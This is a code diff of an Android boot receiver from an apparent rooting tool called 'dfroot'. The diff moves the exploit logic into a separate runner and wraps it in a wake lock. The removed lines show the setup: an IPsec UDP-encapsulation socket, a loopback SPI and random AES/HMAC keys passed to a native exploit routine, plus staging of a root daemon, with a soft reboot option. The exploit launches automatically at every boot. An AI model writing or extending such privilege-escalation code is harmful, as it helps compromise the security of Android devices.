@@ -3,15 +3,10 @@ package df.root;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.net.IpSecAlgorithm;
-import android.net.IpSecManager;
-import android.net.IpSecTransform;
+import android.os.PowerManager;
 import android.util.Log;
 
 import java.io.File;
-import java.net.DatagramSocket;
-import java.net.InetAddress;
-import java.security.SecureRandom;
 
 public class BootReceiver extends BroadcastReceiver implements IReporter {
     private static final String TAG = "dfroot";
@@ -29,54 +24,20 @@ public class BootReceiver extends BroadcastReceiver implements IReporter {
         }
         Log.i(TAG, "boot: " + intent.getAction());
         final Context deCtx = context.createDeviceProtectedStorageContext();
-        new Thread(() -> runExploit(deCtx), "dfroot-boot").start();
-    }
-
-    private void runExploit(Context context) {
-        try {
-            IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
-
-            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
-            int encapPort = encapSock.getPort();
-
-            InetAddress loopback = InetAddress.getByName("127.0.0.1");
-            IpSecManager.SecurityParameterIndex spiObj =
-                    ipsec.allocateSecurityParameterIndex(loopback);
-            int spiVal = spiObj.getSpi();
-
-            SecureRandom rng = new SecureRandom();
-            byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
-            byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);
-
-            IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
-            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);
-
-            DatagramSocket senderSock = new DatagramSocket();
-            int senderPort = senderSock.getLocalPort();
-            senderSock.close();
-
-            IpSecTransform transform = new IpSecTransform.Builder(context)
-                    .setEncryption(enc)
-                    .setAuthentication(auth)
-                    .setIpv4Encapsulation(encapSock, senderPort)
-                    .buildTransportModeTransform(loopback, spiObj);
-
-            MainActivity.stageKsud(context, this);
-
-            boolean softReboot = context.getSharedPreferences("dfroot", Context.MODE_PRIVATE)
-                    .getBoolean("auto_soft_reboot", true);
-
-            int icvLen = 128 / 8;
-            int rc = MainActivity.nativeRunAll(this, encapPort, spiVal,
-                    aesKey, hmacKey, icvLen, senderPort, softReboot);
-            Log.i(TAG, "boot: exploit rc=" + rc);
-
-            transform.close();
-            spiObj.close();
-            encapSock.close();
-
-        } catch (Exception e) {
-            Log.e(TAG, "boot: exploit exception", e);
-        }
+        boolean softReboot = deCtx.getSharedPreferences("dfroot", Context.MODE_PRIVATE)
+                .getBoolean("auto_soft_reboot", true);
+        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "dfroot:boot");
+        wl.acquire();
+        new Thread(() -> {
+            try {
+                int rc = ExploitRunner.run(deCtx, this, softReboot);
+                Log.i(TAG, "boot: exploit rc=" + rc);
+            } catch (Exception e) {
+                Log.e(TAG, "boot: exploit exception", e);
+            } finally {
+                wl.release();
+            }
+        }, "dfroot-boot").start();
     }
 }
